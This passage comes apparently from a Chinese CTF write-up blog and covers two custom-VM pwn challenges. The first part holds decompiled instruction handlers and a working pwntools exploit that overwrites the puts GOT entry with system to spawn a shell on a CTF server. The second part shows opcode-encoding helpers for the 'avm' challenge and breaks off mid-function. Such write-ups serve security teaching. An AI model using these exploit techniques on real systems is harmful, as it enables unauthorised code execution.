</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">push</span><span class="p">:</span> <span class="n">push数据</span><span class="err">，后</span><span class="n">push的在伪造stack的高地址</span>
</span></span><span class="line"><span class="cl"><span class="n">pop</span><span class="err">：</span><span class="n">stack高地址的数据</span><span class="err">，给</span><span class="n">data的低地址</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">:</span> <span class="n">stack两个高地址的数据相加</span><span class="err">，存在</span><span class="n">stack次高地址处</span>
</span></span><span class="line"><span class="cl"><span class="n">sub</span><span class="err">：</span><span class="n">stack两个高地址的数据相减</span><span class="p">(</span><span class="err">高地址减次高地址</span><span class="p">)</span><span class="err">，存在</span><span class="n">stack次高地址处</span>
</span></span><span class="line"><span class="cl"><span class="n">mul</span><span class="p">:</span> <span class="n">stack两个高地址的数据相乘</span><span class="err">，存在</span><span class="n">stack次高地址处</span>
</span></span><span class="line"><span class="cl"><span class="n">div</span><span class="p">:</span> <span class="n">stack两个高地址的数据相除</span><span class="err">，存在</span><span class="n">stack次高地址处</span>
</span></span><span class="line"><span class="cl"><span class="nb">load</span><span class="p">:</span> <span class="err">往</span><span class="n">stack_data</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="err">偏移处，写入基于</span><span class="n">stack_data某偏移内容</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>load指令：</p>
<p>存数据到栈顶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// load
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401CCE</span><span class="p">(</span><span class="n">alloc_heap</span> <span class="o">*</span><span class="n">stack</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">give_v1_2_v2</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">)</span> <span class="p">)</span> <span class="c1">//这里会把flag-1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nf">give_v2_2_V1</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">stack</span><span class="o">-&gt;</span><span class="n">data_ptr</span> <span class="o">+</span> <span class="n">stack</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">+</span> <span class="n">v3</span><span class="p">));</span> <span class="c1">//这里flag+1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>把<code>*((_QWORD *)stack-&gt;data_ptr + stack-&gt;flag + v3))</code>的值给栈顶</p>
<p>注意flag - 1</p>
<p>save指令：</p>
<p>写数据到<code>*((_QWORD *)stack-&gt;data_ptr + stack-&gt;flag + v3)</code>中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// save
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401D37</span><span class="p">(</span><span class="n">alloc_heap</span> <span class="o">*</span><span class="n">stack</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">give_v1_2_v2</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">give_v1_2_v2</span><span class="p">(</span><span class="n">stack</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">)</span> <span class="p">)</span> <span class="c1">//注意这里会把flag -2 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">stack</span><span class="o">-&gt;</span><span class="n">data_ptr</span> <span class="o">+</span> <span class="n">stack</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">+</span> <span class="n">v3</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>先push的是v4</p>
<p>注意flag -2</p>
<p>execute完之后，会<code>puts(s);</code>，这里把puts_got改成system，s写入/bin/sh</p>
<h3 id="exp-1" class="headerLink">
    <a href="#exp-1" class="header-mark"></a>exp</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">address</span> <span class="o">=</span> <span class="s1">&#39;./pwn&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># address = &#39;./pwn_patched&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ss</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># lg      = lambda s,addr		        : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s,addr))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>			        <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">l64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">l32</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">r64</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ir64</span>    <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#-----------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> \
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    b *0x401332
</span></span></span><span class="line"><span class="cl"><span class="s2">    c
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;r&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node5.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29332</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;d&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">gdbscript</span> <span class="o">=</span> <span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># gdb.attach(p)</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># pause()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># data 0x200</span>
</span></span><span class="line"><span class="cl"><span class="c1"># text  0x400</span>
</span></span><span class="line"><span class="cl"><span class="c1"># stack 0x200</span>
</span></span><span class="line"><span class="cl"><span class="c1"># instruction 0x400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your program name:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your instruction:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;push push save push load push add push save&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your stack data:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;4210896 -3 -21 -172800 -21&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">itr</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="长城杯pwn---avm" class="headerLink">
    <a href="#%e9%95%bf%e5%9f%8e%e6%9d%afpwn---avm" class="header-mark"></a>长城杯pwn&mdash;avm</h2><p>文章及附件：https://bbs.kanxue.com/thread-284826.htm</p>
<p>这里我直接拿我本地的libc做了</p>
<p>vm结构体</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">vm_struct</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="n">reg</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="n">rip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="n">opcode</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="n">num</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>交互：</p>
<p>一条指令32个bit，最高4个bit作为instruction，0-4、5-9、16-20作为low,medium,high</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">op</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ope</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">opcode</span><span class="o">&lt;&lt;</span><span class="mi">28</span> <span class="o">|</span> <span class="p">(</span><span class="n">high</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">16</span> <span class="o">|</span> <span class="p">(</span><span class="n">medium</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">5</span> <span class="o">|</span> <span class="p">(</span><span class="n">low</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ope</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="n">op</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">high</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">low</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">src</span><span class="p">,</span><span class="n">opcode</span><span class="o">=</span><span class="mi">9</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ope</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">opcode</span><span class="o">&lt;&lt;</span><span class="mi">28</span> <span class="o">|</span> <span class="p">(</span><span class="n">offset</span><span class="o">&amp;</span><span class="mh">0xfff</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">16</span> <span class="o">|</span> <span class="p">(</span><span class="n">medium</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">5</span> <span class="o">|</span> <span class="p">(</span><span class="n">src</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ope</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">medium</span><span class="p">,</span><span class="n">dest</span><span class="p">,</span><span class="n">opcode</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">ope</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">opcode</span><span class="o">&lt;&lt;</span><span class="mi">28</span> <span class="o">|</span> <span class="p">(</span><span class="n">offset</span><span class="o">&amp;</span><span class="mh">0xfff</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">16</span> <span class="o">|</span> <span class="p">(</span><span class="n">medium</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">5</span> <span class="o">|</span> <span class="p">(</span><span class="n">dest</span><span class="o">&amp;</span><span class="mh">0x1f</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ope</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>指令:</p>
<p>4个字节一个指令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">add: low = high + medium
</span></span><span class="line"><span class="cl">sub: low = medium - high
</span></span><span class="line"><span class="cl">mul: low = high*medium
</span></span><span class="line"><span class="cl">div: low = medium/high
</span></span><span class="line"><span class="cl">xor: low = high^medium
</span></span><span class="line"><span class="cl">and: low = high&amp;medium
</span></span><span class="line"><span class="cl">shl: low = medium&lt;&lt;high
</span></span><span class="line"><span class="cl">shr: low = medium&gt;&gt;high
</span></span></code></pre></td></tr></table>
</div>
</div><p>load：把low寄存器中的内容，写到某栈地址+medium寄存器内容+偏移处</p>
<p>这里low和medium不要是同一寄存器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">load</span><span class="p">(</span><span class="n">vm_struct</span> <span class="o">*</span><span class="n">vm_struct</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">stack</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-20h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">opcode</span> <span class="o">+</span> <span class="p">(</span><span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">rip</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFFFFCLL</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">vm_struct</span><span class="o">-&gt;</span><span class="n">rip</span> <span class="o">+=</span> <span class="mi">4LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">byte_4010</span><span class="p">;</span>          <span class="c1">// 0xff
